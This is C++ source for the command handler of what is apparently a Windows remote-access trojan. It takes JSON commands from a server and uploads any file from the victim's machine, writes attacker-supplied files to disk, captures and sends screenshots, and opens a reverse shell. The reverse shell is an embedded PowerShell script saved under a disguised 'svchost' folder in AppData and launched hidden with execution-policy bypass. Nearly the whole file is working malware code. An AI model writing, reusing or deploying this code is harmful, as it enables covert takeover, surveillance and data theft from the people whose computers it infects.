#include "controller.hpp"
#include "json.hpp"
#include "serpentine.hpp"
#include "networking.hpp"
#include "base64.hpp"

//  Define min max macros required by GDI+ headers.
#ifndef max
#define max(a,b) (((a) > (b)) ? (a) : (b))
#else
#error max macro is already defined
#endif
#ifndef min
#define min(a,b) (((a) < (b)) ? (a) : (b))
#else
#error min macro is already defined
#endif

#include <fstream>
#include <filesystem>
#include <atlbase.h>
#include <atlimage.h>
#include <ShlObj.h>
#include <shellapi.h>
#include <boost/format.hpp>

namespace json = nlohmann;

Controller& Controller::getInstance() {
	static Controller instance;
	return instance;
}

Controller::Controller() {
}

void Controller::dispatch(std::string message) {
	json::json messageJson;
	try {
		messageJson = json::json::parse(message);
	}
	catch (json::json::parse_error ex) {
		return;
	}

	if (!messageJson.contains("id"))
		return;
	if (!messageJson.contains("type") || !messageJson["type"].is_number_unsigned()) {
		json::json response;
		response["id"] = messageJson["id"];
		response["error"] = "Type field is either missing or is not an unsigned integer";
		Networking::sendToServer(response.dump());
		return;
	}

	switch (messageJson["type"].get<int>()) {
	case RequestType::GET_FILE:
		Controller::getFile(messageJson);
		break;
	case RequestType::PUT_FILE:
		Controller::putFile(messageJson);
		break;
	case RequestType::CREATE_REVERSE_SHELL_SESSION:
		Controller::createReverseShellSession(messageJson);
		break;
	case RequestType::GET_SCREENSHOT:
		Controller::getScreenshot(messageJson);
		break;
	}
}

void Controller::sendErrorResponse(long long id, const std::string& message) {
	json::json response;
	response["id"] = id;
	response["error"] = message;
	Networking::sendToServer(response.dump());
}

void Controller::getFile(json::json message) {
	if (!message.contains("filename") || !message["filename"].is_string()) {
		sendErrorResponse(message["id"], "Filename is missing or is not a string");
		return;
	}

	std::ifstream fileStream(message["filename"].get<std::string>(), std::ios::binary);
	if (!fileStream.is_open()) {
		sendErrorResponse(message["id"], "File doesn't exist or can't be opened");
		return;
	}

	std::string fileString((std::istreambuf_iterator<char>(fileStream)), std::istreambuf_iterator<char>());
	std::string fileBase64String = "";
	try
	{
		fileBase64String = base64_encode(fileString);
	}
	catch (const std::exception& e)
	{
		sendErrorResponse(message["id"], e.what());
		return;
	}

	json::json response;
	response["id"] = message["id"];
	response["file"] = fileBase64String;
	Networking::sendToServer(response.dump());
}

void Controller::putFile(json::json message) {
	if (!message.contains("file") || !message["file"].is_string()) {
		sendErrorResponse(message["id"], "File is missing or is not a string");
		return;
	}
	if (!message.contains("filename") || !message["filename"].is_string()) {
		sendErrorResponse(message["id"], "Filename is missing or is not a string");
		return;
	}

	std::string decodedFile = "";
	try
	{
		decodedFile = base64_decode(message["file"]);
	}
	catch (const std::exception& e)
	{
		sendErrorResponse(message["id"], e.what());
		return;
	}

	std::filesystem::path filePath(message["filename"].get<std::string>());
	std::error_code ec;
	if (std::filesystem::exists(filePath, ec) && !ec)
		std::filesystem::remove(filePath, ec);
	std::ofstream fileStream(filePath, std::ios::binary);
	if (!fileStream.is_open()) {
		sendErrorResponse(message["id"], "Couldn't open the file for writing");
		return;
	}
	fileStream << decodedFile;

	json::json response;
	response["id"] = message["id"];
	Networking::sendToServer(response.dump());
}

static std::string reverseShellScript = "function cleanup { if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit;}; $a = '%1%'; $p = '%2%'; $c = New-Object system.net.sockets.tcpclient; $c.connect($a,$p); $s = $c.GetStream(); $networkbuffer = New-Object System.Byte[] $c.ReceiveBufferSize; $p = New-Object System.Diagnostics.Process; $p.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'; $p.StartInfo.RedirectStandardInput = 1; $p.StartInfo.RedirectStandardOutput = 1; $p.StartInfo.UseShellExecute = 0; $p.Start(); $is = $p.StandardInput; $os = $p.StandardOutput; Start-Sleep 1; $encoding = new-object System.Text.AsciiEncoding; while($os.Peek() -ne -1){$out += $encoding.GetString($os.Read())}; $s.Write($encoding.GetBytes($out),0,$out.Length); $out = $null; $done = $false; $testing = 0; while (-not $done) { if ($c.Connected -ne $true) {cleanup;}; $pos = 0; $i = 1; while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) { $read = $s.Read($networkbuffer,$pos,$networkbuffer.Length - $pos); $pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}; if ($pos -gt 0) { $string = $encoding.GetString($networkbuffer,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {cleanup;} else { $out = $encoding.GetString($os.Read()); while($os.Peek() -ne -1){ $out += $encoding.GetString($os.Read()); if ($out -eq $string) {$out = ''}}; $s.Write($encoding.GetBytes($out),0,$out.length); $out = $null; $string = $null;}} else {cleanup;}}";

void Controller::createReverseShellSession(json::json message) {
	if (!message.contains("address")) {
		sendErrorResponse(message["id"], "Address is missing");
		return;
	}
	if (!message.contains("port")) {
		sendErrorResponse(message["id"], "Port is missing");
		return;
	}

	std::string script = str(boost::format(reverseShellScript) % message["address"].get<std::string>() % message["port"].get<std::string>());

	TCHAR appdataPath[MAX_PATH];
	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdataPath);
	PathAppend(appdataPath, _T("\\svchost"));
	PathAppend(appdataPath, _T("\\rs.ps1"));
	HANDLE scriptFile = CreateFile(appdataPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD bytesWritten;
	WriteFile(scriptFile, script.c_str(), strlen(script.c_str()), &bytesWritten, NULL);
	CloseHandle(scriptFile);

	std::wstring appdataPathString(&appdataPath[0]);
	std::wstring command = L"/C PowerShell.exe -ExecutionPolicy Bypass -File " + appdataPathString;

	ShellExecute(0, L"open", L"cmd.exe", command.c_str(), 0, SW_HIDE);

	json::json response;
	response["id"] = message["id"];
	Networking::sendToServer(response.dump());
}

void Controller::getScreenshot(json::json message) {
    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    HGDIOBJ hTempBitmap;
    HBITMAP hBitmap;
    BITMAP bAllDesktops;
    HDC hDC, hMemDC;
    LONG lWidth, lHeight;
    BYTE *bBits = NULL;
    HANDLE hHeap = GetProcessHeap();
    DWORD cbBits, dwWritten = 0;
    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
    ZeroMemory(&bAllDesktops, sizeof(BITMAP));

    hDC = GetDC(NULL);
    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

    lWidth = bAllDesktops.bmWidth;
    lHeight = bAllDesktops.bmHeight;

    DeleteObject(hTempBitmap);

    bfHeader.bfType = (WORD)('B' | ('M' << 8));
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;
    biHeader.biPlanes = 1;
    biHeader.biWidth = lWidth;
    biHeader.biHeight = lHeight;

    bInfo.bmiHeader = biHeader;

    cbBits = (((24 * lWidth + 31)&~31) / 8) * lHeight;

    hMemDC = CreateCompatibleDC(hDC);
    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID **)&bBits, NULL, 0);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);

    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);

    std::vector<BYTE> buf;
    IStream *stream = NULL;
    HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
    CImage image;
    ULARGE_INTEGER liSize;

    image.Attach(hBitmap);
    image.Save(stream, Gdiplus::ImageFormatJPEG);
    IStream_Size(stream, &liSize);
    DWORD len = liSize.LowPart;
    IStream_Reset(stream);
    buf.resize(len);
    IStream_Read(stream, &buf[0], len);
    stream->Release();

    std::string fileBase64String = base64_encode(std::string(buf.begin(), buf.end()));

    json::json response;
    response["id"] = message["id"];
    response["file"] = fileBase64String;
    Networking::sendToServer(response.dump());

    DeleteObject(hBitmap);
}
